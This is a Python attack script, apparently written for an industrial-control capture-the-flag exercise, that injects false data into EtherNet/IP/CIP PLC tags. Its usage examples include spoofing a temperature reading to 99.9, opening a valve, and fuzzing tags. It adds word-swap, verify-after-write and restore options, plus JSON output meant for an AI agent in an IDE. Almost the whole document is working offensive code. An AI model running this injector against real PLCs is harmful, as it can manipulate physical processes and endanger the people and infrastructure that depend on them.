#!/usr/bin/env python3
"""
===================================================================
🏴‍☠️ ENIP/CIP FALSE DATA INJECTOR (GOD-MODE & AI-READY) 🏴‍☠️
===================================================================
# วิธีใช้ (Usage Examples):

# 1. เขียนค่าเปลี่ยนสถานะ (เช่น ปลอมแปลงอุณหภูมิเซนเซอร์เป็น 99.9)
python3 enip_cpppo_write_find_flags.py --ip 10.10.10.5 --tag "Temperature" --type "REAL" --write "99.9"

# 2. เปิดสวิตช์/วาล์ว (BOOL)
python3 enip_cpppo_write_find_flags.py --ip 10.10.10.5 --tag "Valve_Open" --type "BOOL" --write "1"

# 3. โหมด Fuzzing แบบปลอดภัย (เขียนค่า 1337 ทิ้งไว้ 1 วินาที แล้วคืนค่าเดิมทันที)
python3 enip_cpppo_write_find_flags.py --ip 10.10.10.5 --tag "@8/1/5" --type "INT" --write "1337" --restore

# 4. รันผ่าน Trae IDE (พ่นผลลัพธ์เป็น JSON สำหรับ AI)
python3 enip_cpppo_write_find_flags.py --ip 10.10.10.5 --tag "TargetTag" --write "999" --json

# 5. NEW: Word-Swap (สำหรับ PDS-9000 family ที่ใช้ swapped DINT layout)
#    เช่น เขียน C0DE,A001 จะถูกสลับเป็น A001,C0DE ก่อนส่ง
python3 enip_cpppo_write_find_flags.py --ip 192.168.1.22 --tag "@0x64/1/3" \
    --type INT --write "0xC0DE,0xA001" --word-swap --verify

# 6. NEW: Silent-Lock Detection (--verify จะอ่านกลับเช็คว่า value เปลี่ยนจริงไหม)
python3 enip_cpppo_write_find_flags.py --ip <IP> --tag "@0x64/1/2" \
    --type INT --write "1" --verify
===================================================================

Lessons learned (BlackStart Grid CTF, Apr 2026):
- cpppo `dev.write()` returns a generator that MUST be wrapped in list() or iterated,
  otherwise the packet is never actually sent (silent failure).
- PDS-9000 emulator family uses Word-Swapped DINT layout (lower-word first).
- Silent-Lock: PLC may ack writes (status 0x00) but ignore them when in wrong state.
  Always verify by reading back.
- Hex literals (0xC0DE) for INT/DINT must be supported in --write.
"""
import argparse
import sys
import time
import json

try:
    from cpppo.server.enip.get_attribute import proxy_simple
except ImportError:
    print("\033[91m[-] Missing 'cpppo' library. Please run: pip install cpppo\033[0m")
    sys.exit(1)

# --- ANSI Colors for Hacker UI ---
G = '\033[92m'  # Green
Y = '\033[93m'  # Yellow
R = '\033[91m'  # Red
C = '\033[96m'  # Cyan
W = '\033[0m'   # Reset

def main():
    parser = argparse.ArgumentParser(description="Write to EtherNet/IP Tags to Trigger Flags (AI Ready)")
    parser.add_argument("--ip", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=44818, help="Target Port (default: 44818)")
    parser.add_argument("--tag", required=True, help="Tag name or CIP path (e.g., 'MyTag' or '@8/1/1')")
    parser.add_argument("--type", default="INT", help="Data type (REAL, DINT, BOOL, SINT, INT, STRING)")
    parser.add_argument("--write", required=True, help="Value(s) to write (comma separated for arrays)")
    parser.add_argument("--restore", action="store_true", help="Safe Mode: Restore original value after writing")
    parser.add_argument("--json", action="store_true", help="Output pure JSON for Trae IDE")
    parser.add_argument("--word-swap", action="store_true",
                        help="NEW: Swap word order before write (for PDS-9000 family DINT-as-INT[2])")
    parser.add_argument("--verify", action="store_true",
                        help="NEW: Read back after write to detect silent-lock pattern")
    parser.add_argument("--verify-delay", type=float, default=0.5,
                        help="Seconds to wait before verify read (default: 0.5)")

    args = parser.parse_args()

    # โครงสร้าง JSON สำหรับ AI
    ai_report = {
        "target": f"{args.ip}:{args.port}",
        "tag": args.tag,
        "type": args.type,
        "status": "success",
        "error_msg": "",
        "original_value": None,
        "injected_value": args.write,
        "restore_status": "not_requested"
    }

    if not args.json:
        print(f"\n{C}=================================================={W}")
        print(f"{C} 💉 ENIP FALSE DATA INJECTOR (GOD-MODE) 💉 {W}")
        print(f"{C}=================================================={W}")
        print(f"[*] Connecting to target: {Y}{args.ip}:{args.port}{W}")

    try:
        dev = proxy_simple(args.ip, port=args.port)
    except Exception as e:
        if args.json:
            ai_report["status"] = "connection_failed"
            ai_report["error_msg"] = str(e)
            print(json.dumps(ai_report, indent=2))
        else:
            print(f"{R}[-] Connection failed: {e}{W}")
        sys.exit(1)

    # --- 1. Parse Data Type (แปลงกระสุนให้เข้ากับกระบอกปืน) ---
    raw_values = [v.strip() for v in args.write.split(',')]
    write_values = []
    try:
        for v in raw_values:
            v_upper = args.type.upper()
            if 'REAL' in v_upper:
                write_values.append(float(v))
            elif 'BOOL' in v_upper:
                write_values.append(v.lower() in ('true', '1', 'yes', 't', 'on'))
            elif 'STRING' in v_upper:
                write_values.append(v)
            else:
                # NEW: Support hex literals (0xC0DE) and signed/unsigned conversion
                if v.lower().startswith('0x'):
                    raw = int(v, 16)
                else:
                    raw = int(v)
                # Convert UINT16 -> signed INT16 if needed (cpppo INT is signed)
                if 'INT' in v_upper and 'UINT' not in v_upper and raw > 32767:
                    raw = raw - 0x10000
                write_values.append(raw)
    except ValueError:
        if args.json:
            ai_report["status"] = "parsing_error"
            ai_report["error_msg"] = f"Cannot parse '{args.write}' as {args.type}"
            print(json.dumps(ai_report, indent=2))
        else:
            print(f"{R}[-] Error parsing value '{args.write}' for type {args.type}{W}")
        sys.exit(1)

    # NEW: Word-Swap for PDS-9000 family (lower-word first DINT layout)
    if args.word_swap and len(write_values) >= 2:
        if not args.json:
            print(f"  {Y}[!] --word-swap enabled: {write_values} -> {write_values[::-1]}{W}")
        write_values = write_values[::-1]
        ai_report["word_swap_applied"] = True

    val_to_inject = write_values[0] if len(write_values) == 1 else write_values

    # --- 2. Pre-flight Check (แอบอ่านค่าดั้งเดิม) ---
    orig_val = None
    try:
        if not args.json: print(f"[*] Pre-flight check: Reading current state of {Y}{args.tag}{W}...")
        read_resp = dev.read([args.tag])
        if read_resp and len(read_resp) > 0 and read_resp[0] is not None:
            orig_val = read_resp[0]
            ai_report["original_value"] = orig_val
            if not args.json: print(f"  {G}[+] Original Value: {orig_val}{W}")
        else:
            if not args.json: print(f"  {Y}[!] Could not read original value (Tag might be write-only or missing).{W}")
    except Exception as e:
        if not args.json: print(f"  {Y}[!] Read failed: {e}. Will attempt blind write.{W}")

    # --- 3. Attack (ยิง Fuzz / False Data) ---
    # CRITICAL: cpppo dev.write() returns a generator. MUST wrap with list() to force send.
    if not args.json: print(f"[*] Injecting payload: {Y}{val_to_inject}{W} (Type: {args.type})...")
    try:
        if args.type:
            write_resp = list(dev.write([(args.tag, (args.type, val_to_inject))]))
        else:
            write_resp = list(dev.write([(args.tag, val_to_inject)]))

        if not args.json: print(f"  {G}[+] Write executed (cpppo generator drained).{W}")

    except Exception as e:
        if args.json:
            ai_report["status"] = "injection_failed"
            ai_report["error_msg"] = str(e)
            print(json.dumps(ai_report, indent=2))
        else:
            print(f"  {R}[-] Write failed: {e}{W}")
        sys.exit(1)

    # --- 3.5 NEW: Verify-After-Write (Silent-Lock Detection) ---
    if args.verify:
        if not args.json:
            print(f"[*] Verifying write took effect (waiting {args.verify_delay}s)...")
        time.sleep(args.verify_delay)
        try:
            verify_resp = dev.read([args.tag])
            verify_val = verify_resp[0] if verify_resp and verify_resp[0] is not None else None
            ai_report["verify_value"] = verify_val

            # Compare written vs read-back
            expected = write_values if len(write_values) > 1 else write_values[0]
            # Normalize: cpppo returns lists
            verify_norm = verify_val[0] if isinstance(verify_val, list) and len(verify_val) == 1 else verify_val
            expected_norm = expected[0] if isinstance(expected, list) and len(expected) == 1 else expected

            if verify_norm == expected_norm or verify_val == expected:
                if not args.json:
                    print(f"  {G}[+] VERIFIED: value persisted correctly ({verify_val}){W}")
                ai_report["verify_status"] = "persisted"
            else:
                if not args.json:
                    print(f"  {R}[!] SILENT-LOCK DETECTED!{W}")
                    print(f"  {R}    Expected: {expected}{W}")
                    print(f"  {R}    Got back: {verify_val}{W}")
                    print(f"  {Y}    -> PLC accepted write but did not apply (state-gated){W}")
                ai_report["verify_status"] = "silent_lock"
                ai_report["silent_lock_detected"] = True
        except Exception as e:
            ai_report["verify_status"] = f"verify_failed: {e}"
            if not args.json: print(f"  {Y}[!] Verify read failed: {e}{W}")

    # --- 4. Auto-Restore (คืนค่าเดิมถ้าต้องการ) ---
    if args.restore:
        if orig_val is not None:
            if not args.json: print(f"[*] Safe Mode: Restoring original value ({orig_val}) in 1 second...")
            time.sleep(1)
            try:
                # ต้องแกะค่าออกจาก List/Tuple ก่อนเขียนกลับถ้าอ่านมาแล้วติดโครงสร้างมาด้วย
                restore_val = orig_val[0] if isinstance(orig_val, (list, tuple)) and len(orig_val) == 1 else orig_val

                if args.type:
                    list(dev.write([(args.tag, (args.type, restore_val))]))
                else:
                    list(dev.write([(args.tag, restore_val)]))

                ai_report["restore_status"] = "success"
                if not args.json: print(f"  {G}[+] Target restored to original state safely.{W}")
            except Exception as e:
                ai_report["restore_status"] = f"failed: {str(e)}"
                if not args.json: print(f"  {R}[-] Restore failed! System might be unstable: {e}{W}")
        else:
            ai_report["restore_status"] = "failed_no_original_data"
            if not args.json: print(f"  {R}[-] Cannot restore: Original value was not captured.{W}")

    # --- 5. สรุปผลลัพธ์ ---
    if args.json:
        print(json.dumps(ai_report, indent=2))
    else:
        print(f"\n{C}=================================================={W}")
        print(f"{G}[*] Mission Complete.{W}")

if __name__ == "__main__":
    main()